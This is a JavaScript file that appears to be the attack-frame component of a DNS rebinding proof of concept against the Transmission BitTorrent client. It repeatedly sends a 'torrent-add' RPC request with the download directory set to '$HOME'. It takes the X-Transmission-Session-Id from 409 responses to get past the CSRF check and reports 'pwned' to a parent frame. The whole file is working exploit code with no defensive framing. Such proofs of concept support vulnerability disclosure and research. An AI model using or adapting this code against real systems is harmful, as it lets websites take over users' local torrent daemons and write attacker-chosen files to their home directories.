var timer;
var frame;
var sessionid;
var xhr;
var interval = 60000;
var command = JSON.stringify({
		method: "torrent-add",
		arguments: {
			"download-dir": "$HOME",
			filename: "hello.torrent",
			paused: false
		}
	});

function sendRpc() {
	xhr = new XMLHttpRequest();
	xhr.open("POST", "/transmission/rpc", false);

	if (sessionid) {
		xhr.setRequestHeader("X-Transmission-Session-Id", sessionid);
	}

	try {
		xhr.send(command);
	} catch(e) {
		console.log("failed to send xhr");
	}

	if (xhr.status == 404) {
		console.log("frame", window.location.hostname, "has not updated dns yet, waiting", interval, "milliseconds");
		return;
	}

	console.log("attack frame", window.location.hostname, "received xhr response", xhr.status);

	if (xhr.status == 200) {
		clearInterval(timer);
		window.parent.postMessage({status: "pwned", response: xhr.responseText}, "*");
	} else if (xhr.status == 409) {
		sessionid = xhr.getResponseHeader("X-Transmission-Session-Id")
		window.parent.postMessage({status: "session", sessionid: sessionid }, "*")
		sendRpc();
	} else if (xhr.status == 401) {
		clearInterval(timer);
		window.parent.postMessage({status: "auth" }, "*");
	}
}

function begin() {
	// Notify the parent that we're loaded.
	window.parent.postMessage({status: "start"}, "*");
}

window.addEventListener("message", function (e) {
	console.log("attack frame", window.location.hostname, "received message", e.data.cmd);

	switch (e.data.cmd) {
	case "interval":
		interval = parseInt(e.data.param) * 1000;
		break;
	case "stop":
		clearInterval(timer);
		break;
	case "start":
		timer = setInterval(sendRpc, interval);
		console.log("frame", window.location.hostname, "waiting", interval, "milliseconds for dns update");
        break;
	}
});
